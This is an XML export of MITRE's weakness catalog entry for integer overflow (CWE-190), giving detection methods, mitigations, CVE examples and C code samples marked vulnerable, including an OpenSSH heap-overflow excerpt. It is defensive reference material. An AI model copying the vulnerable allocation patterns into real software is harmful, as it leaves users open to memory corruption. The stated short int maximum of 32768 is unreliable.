<ns0:Weakness_Catalog xmlns:html="http://www.w3.org/1999/xhtml" xmlns:ns0="http://cwe.mitre.org/cwe-7" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" Name="VIEW LIST: CWE-1000: Research Concepts" Version="4.12" Date="2023-06-29" xsi:schemaLocation="http://cwe.mitre.org/cwe-7 http://cwe.mitre.org/data/xsd/cwe_schema_v7.0.xsd">
   <ns0:Weaknesses>
      <ns0:Weakness ID="190" Name="Integer Overflow or Wraparound" Abstraction="Base" Structure="Simple" Status="Stable">
         <ns0:Description>The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.</ns0:Description>
         <ns0:Extended_Description>An integer overflow or wraparound occurs when an integer value is incremented to a value that is too large to store in the associated representation. When this occurs, the value may wrap to become a very small or negative number. While this may be intended behavior in circumstances that rely on wrapping, it can have security consequences if the wrap is unexpected. This is especially the case if the integer overflow can be triggered using user-supplied inputs. This becomes security-critical when the result is used to control looping, make a security decision, or determine the offset or size in behaviors such as memory allocation, copying, concatenation, etc.</ns0:Extended_Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="682" View_ID="1000" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="682" View_ID="1003" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="700" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="CanPrecede" CWE_ID="119" View_ID="1000" Chain_ID="680" />
         </ns0:Related_Weaknesses>
         <ns0:Applicable_Platforms>
            <ns0:Language Class="Not Language-Specific" Prevalence="Undetermined" />
         </ns0:Applicable_Platforms>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Likelihood_Of_Exploit>Medium</ns0:Likelihood_Of_Exploit>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>DoS: Crash, Exit, or Restart</ns0:Impact>
               <ns0:Impact>DoS: Resource Consumption (CPU)</ns0:Impact>
               <ns0:Impact>DoS: Resource Consumption (Memory)</ns0:Impact>
               <ns0:Impact>DoS: Instability</ns0:Impact>
               <ns0:Note>This weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Memory</ns0:Impact>
               <ns0:Note>If the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Code or Commands</ns0:Impact>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
               <ns0:Note>This weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy.</ns0:Note>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
            <ns0:Detection_Method Detection_Method_ID="DM-1">
               <ns0:Method>Automated Static Analysis</ns0:Method>
               <ns0:Description>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method Detection_Method_ID="DM-2">
               <ns0:Method>Black Box</ns0:Method>
               <ns0:Description>Sometimes, evidence of this weakness can be detected using dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</ns0:Description>
               <ns0:Effectiveness>Moderate</ns0:Effectiveness>
               <ns0:Effectiveness_Notes>Without visibility into the code, black box methods may not be able to sufficiently distinguish this weakness from others, requiring follow-up manual methods to diagnose the underlying problem.</ns0:Effectiveness_Notes>
            </ns0:Detection_Method>
            <ns0:Detection_Method Detection_Method_ID="DM-7">
               <ns0:Method>Manual Analysis</ns0:Method>
               <ns0:Description>
                  <html:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</html:p>
                  <html:p>Specifically, manual static analysis is useful for evaluating the correctness of allocation calculations. This can be useful for detecting overflow conditions (CWE-190) or similar weaknesses that might have serious security impacts on the program.</html:p>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
               <ns0:Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</ns0:Effectiveness_Notes>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis - Binary or Bytecode</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</html:li>
                           <html:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Dynamic Analysis with Manual Results Interpretation</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Fuzz Tester</html:li>
                           <html:li>Framework-based Fuzzer</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Manual Static Analysis - Source Code</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Manual Source Code Review (not inspections)</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis - Source Code</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Source code Weakness Analyzer</html:li>
                           <html:li>Context-configured Source Code Weakness Analyzer</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Architecture or Design Review</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Formal Methods / Correct-By-Construction</html:li>
                        </html:ul>
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation>
               <ns0:Phase>Requirements</ns0:Phase>
               <ns0:Description>Ensure that all protocols are strictly defined, such that all out-of-bounds behavior can be identified simply, and require strict conformance to the protocol.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-3">
               <ns0:Phase>Requirements</ns0:Phase>
               <ns0:Strategy>Language Selection</ns0:Strategy>
               <ns0:Description>
                  <html:p>Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</html:p>
                  <html:p>If possible, choose a language or compiler that performs automatic bounds checking.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-4">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Strategy>Libraries or Frameworks</ns0:Strategy>
               <ns0:Description>
                  <html:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</html:p>
                  <html:p>Use libraries or frameworks that make it easier to handle numbers without unexpected consequences.</html:p>
                  <html:p>Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++). [REF-106]</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-8">
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Strategy>Input Validation</ns0:Strategy>
               <ns0:Description>
                  <html:p>Perform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range.</html:p>
                  <html:p>Use unsigned integers where possible. This makes it easier to perform validation for integer overflows. When signed integers are required, ensure that the range check includes minimum values as well as maximum values.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-36">
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>
                  <html:p>Understand the programming language's underlying representation and how it interacts with numeric calculation (CWE-681). Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, "not-a-number" calculations, and how the language handles numbers that are too large or too small for its underlying representation. [REF-7]</html:p>
                  <html:p>Also be careful to account for 32-bit, 64-bit, and other potential differences that may affect the numeric representation.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-15">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-26">
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Strategy>Compilation or Build Hardening</ns0:Strategy>
               <ns0:Description>Examine compiler warnings closely and eliminate problems with potential security implications, such as signed / unsigned mismatch in memory operations, or use of uninitialized variables. Even if the weakness is rarely exploitable, a single failure may lead to the compromise of the entire system.</ns0:Description>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-33">
               <ns0:Intro_Text>The following image processing code allocates a table for images.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>img_t table_ptr; /*struct containing img data, 10kB each*/<html:br />int num_imgs;<html:br />...<html:br />num_imgs = get_num_imgs();<html:br />table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);<html:br />...</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow (CWE-190). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long, it may result in many types of out-of-bounds problems (CWE-119).</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>The following code excerpt from OpenSSH 3.3 demonstrates a classic case of integer overflow:</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>nresp = packet_get_int();<html:br />if (nresp &gt; 0) {<html:div style="margin-left:1em;">response = xmalloc(nresp*sizeof(char*));<html:br />for (i = 0; i &lt; nresp; i++) response[i] = packet_get_string(NULL);</html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>If nresp has the value 1073741824 and sizeof(char*) has its typical value of 4, then the result of the operation nresp*sizeof(char*) overflows, and the argument to xmalloc() will be 0. Most malloc() implementations will happily allocate a 0-byte buffer, causing the subsequent loop iterations to overflow the heap buffer response.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>Integer overflows can be complicated and difficult to detect. The following example is an attempt to show how an integer overflow may lead to undefined looping behavior:</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>short int bytesRec = 0;<html:br />char buf[SOMEBIGNUM];<html:br />
                     <html:br />while(bytesRec &lt; MAXGET) {<html:div style="margin-left:1em;">bytesRec += getFromInput(buf+bytesRec);</html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>In the above case, it is entirely possible that bytesRec may overflow, continuously creating a lower number than MAXGET and also overwriting the first MAXGET-1 bytes of buf.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>In this example the method determineFirstQuarterRevenue is used to determine the first quarter revenue for an accounting/business application. The method retrieves the monthly sales totals for the first three months of the year, calculates the first quarter sales totals from the monthly sales totals, calculates the first quarter revenue based on the first quarter sales, and finally saves the first quarter revenue results to the database.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>#define JAN 1<html:br />#define FEB 2<html:br />#define MAR 3<html:br />
                     <html:br />short getMonthlySales(int month) {...}<html:br />
                     <html:br />float calculateRevenueForQuarter(short quarterSold) {...}<html:br />
                     <html:br />int determineFirstQuarterRevenue() {<html:div style="margin-left:1em;">
                        <html:div>
                           <html:br />
                           <html:i>// Variable for sales revenue for the quarter</html:i>
                           <html:br />float quarterRevenue = 0.0f;<html:br />
                           <html:br />short JanSold = getMonthlySales(JAN); /* Get sales in January */<html:br />short FebSold = getMonthlySales(FEB); /* Get sales in February */<html:br />short MarSold = getMonthlySales(MAR); /* Get sales in March */<html:br />
                           <html:br />
                           <html:i>// Calculate quarterly total</html:i>
                           <html:br />short quarterSold = JanSold + FebSold + MarSold;<html:br />
                           <html:br />
                           <html:i>// Calculate the total revenue for the quarter</html:i>
                           <html:br />quarterRevenue = calculateRevenueForQuarter(quarterSold);<html:br />
                           <html:br />saveFirstQuarterRevenue(quarterRevenue);<html:br />
                           <html:br />return 0;</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>However, in this example the primitive type short int is used for both the monthly and the quarterly sales variables. In C the short int primitive type has a maximum value of 32768. This creates a potential integer overflow if the value for the three monthly sales adds up to more than the maximum value for the short int primitive type. An integer overflow can lead to data corruption, unexpected behavior, infinite loops and system crashes. To correct the situation the appropriate primitive type should be used, as in the example below, and/or provide some validation mechanism to ensure that the maximum value for the primitive type is not exceeded.</ns0:Body_Text>
               <ns0:Example_Code Nature="Good" Language="C">
                  <html:div>...<html:br />float calculateRevenueForQuarter(long quarterSold) {...}<html:br />
                     <html:br />int determineFirstQuarterRevenue() {<html:div style="margin-left:1em;">
                        <html:div>...<html:br />
                           <html:i>// Calculate quarterly total</html:i>
                           <html:br />long quarterSold = JanSold + FebSold + MarSold;<html:br />
                           <html:br />
                           <html:i>// Calculate the total revenue for the quarter</html:i>
                           <html:br />quarterRevenue = calculateRevenueForQuarter(quarterSold);<html:br />
                           <html:br />...</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>Note that an integer overflow could also occur if the quarterSold variable has a primitive type long but the method calculateRevenueForQuarter has a parameter of type short.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2022-21668</ns0:Reference>
               <ns0:Description>Chain: Python library does not limit the resources used to process images that specify a very large number of bands (CWE-1284), leading to excessive memory consumption (CWE-789) or an integer overflow (CWE-190).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2022-21668</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-30860</ns0:Reference>
               <ns0:Description>Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-30860</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-30663</ns0:Reference>
               <ns0:Description>Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-30663</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2018-10887</ns0:Reference>
               <ns0:Description>Chain: unexpected sign extension (CWE-194) leads to integer overflow (CWE-190), causing an out-of-bounds read (CWE-125)</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2018-10887</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2019-1010006</ns0:Reference>
               <ns0:Description>Chain: compiler optimization (CWE-733) removes or modifies code used to detect integer overflow (CWE-190), allowing out-of-bounds write (CWE-787).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2019-1010006</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-2753</ns0:Reference>
               <ns0:Description>Chain: integer overflow leads to use-after-free</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-2753</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-1513</ns0:Reference>
               <ns0:Description>Chain: integer overflow in securely-coded mail program leads to buffer overflow. In 2005, this was regarded as unrealistic to exploit, but in 2020, it was rediscovered to be easier to exploit due to evolutions of the technology.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-1513</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-0391</ns0:Reference>
               <ns0:Description>Integer overflow via a large number of arguments.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-0391</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-0639</ns0:Reference>
               <ns0:Description>Integer overflow in OpenSSH as listed in the demonstrative examples.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-0639</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-1141</ns0:Reference>
               <ns0:Description>Image with large width and height leads to integer overflow.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-1141</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-0102</ns0:Reference>
               <ns0:Description>Length value of -1 leads to allocation of 0 bytes and resultant heap overflow.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-0102</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-2013</ns0:Reference>
               <ns0:Description>Length value of -1 leads to allocation of 0 bytes and resultant heap overflow.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-2013</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2017-1000121</ns0:Reference>
               <ns0:Description>chain: unchecked message size metadata allows integer overflow (CWE-190) leading to buffer overflow (CWE-119).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2017-1000121</ns0:Link>
            </ns0:Observed_Example>
	    <ns0:Observed_Example>
	      <ns0:Reference>CVE-2013-1591</ns0:Reference>
	      <ns0:Description>Chain: an integer overflow (CWE-190) in the image size calculation causes an infinite loop (CWE-835) which sequentially allocates buffers without limits (CWE-1325) until the stack is full.</ns0:Description>
	      <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2013-1591</ns0:Link>
	    </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Functional_Areas>
            <ns0:Functional_Area>Number Processing</ns0:Functional_Area>
            <ns0:Functional_Area>Memory Management</ns0:Functional_Area>
            <ns0:Functional_Area>Counters</ns0:Functional_Area>
         </ns0:Functional_Areas>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <ns0:Entry_Name>Integer overflow (wrap or wraparound)</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <ns0:Entry_Name>Integer Overflow</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CLASP">
               <ns0:Entry_Name>Integer overflow</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>INT18-C</ns0:Entry_ID>
               <ns0:Entry_Name>Evaluate integer expressions in a larger size before comparing or assigning to that size</ns0:Entry_Name>
               <ns0:Mapping_Fit>CWE More Abstract</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>INT30-C</ns0:Entry_ID>
               <ns0:Entry_Name>Ensure that unsigned integer operations do not wrap</ns0:Entry_Name>
               <ns0:Mapping_Fit>CWE More Abstract</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>INT32-C</ns0:Entry_ID>
               <ns0:Entry_Name>Ensure that operations on signed integers do not result in overflow</ns0:Entry_Name>
               <ns0:Mapping_Fit>Imprecise</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>INT35-C</ns0:Entry_ID>
               <ns0:Entry_Name>Evaluate integer expressions in a larger size before comparing or assigning to that size</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>MEM07-C</ns0:Entry_ID>
               <ns0:Entry_Name>Ensure that the arguments to calloc(), when multiplied, do not wrap</ns0:Entry_Name>
               <ns0:Mapping_Fit>CWE More Abstract</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>MEM35-C</ns0:Entry_ID>
               <ns0:Entry_Name>Allocate sufficient memory for an object</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>3</ns0:Entry_ID>
               <ns0:Entry_Name>Integer Overflows</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
              <ns0:Entry_ID>SFP1</ns0:Entry_ID>
              <ns0:Entry_Name>Glitch in computation</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 3-3</ns0:Entry_ID>
	      <ns0:Entry_Name>Req SR 3.5</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 3-3</ns0:Entry_ID>
	      <ns0:Entry_Name>Req SR 7.2</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 4-1</ns0:Entry_ID>
	      <ns0:Entry_Name>Req SR-2</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 4-1</ns0:Entry_ID>
	      <ns0:Entry_Name>Req SI-2</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 4-1</ns0:Entry_ID>
	      <ns0:Entry_Name>Req SVV-1</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 4-1</ns0:Entry_ID>
	      <ns0:Entry_Name>Req SVV-3</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 4-2</ns0:Entry_ID>
	      <ns0:Entry_Name>Req CR 3.5</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
	    <ns0:Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	      <ns0:Entry_ID>Part 4-2</ns0:Entry_ID>
	      <ns0:Entry_Name>Req CR 7.2</ns0:Entry_Name>
	    </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern CAPEC_ID="92" />
         </ns0:Related_Attack_Patterns>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-145" />
            <ns0:Reference External_Reference_ID="REF-146" />
            <ns0:Reference External_Reference_ID="REF-7" Section="Chapter 20, &quot;Integer Overflows&quot; Page 620" />
            <ns0:Reference External_Reference_ID="REF-44" Section="&quot;Sin 7: Integer Overflows.&quot; Page 119" />
            <ns0:Reference External_Reference_ID="REF-106" />
            <ns0:Reference External_Reference_ID="REF-150" />
            <ns0:Reference External_Reference_ID="REF-62" Section="Chapter 6, &quot;Signed Integer Boundaries&quot;, Page 220" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Allowed</ns0:Usage>
            <ns0:Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</ns0:Rationale>
            <ns0:Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Acceptable-Use" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Notes>
            <ns0:Note Type="Relationship">Integer overflows can be primary to buffer overflows.</ns0:Note>
            <ns0:Note Type="Terminology">"Integer overflow" is sometimes used to cover several types of errors, including signedness errors, or buffer overflows that involve manipulation of integer data types instead of characters. Part of the confusion results from the fact that 0xffffffff is -1 in a signed context. Other confusion also arises because of the role that integer overflows have in chains.</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>PLOVER</ns0:Submission_Name>
               <ns0:Submission_Date>2006-07-19</ns0:Submission_Date>
               <ns0:Submission_Version>Draft 3</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2006-07-19</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Relationships, Relationship_Notes, Taxonomy_Mappings, Terminology_Notes</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-10-14</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Description, Potential_Mitigations, Terminology_Notes</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-11-24</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-01-12</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description, Name</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-05-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-10-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
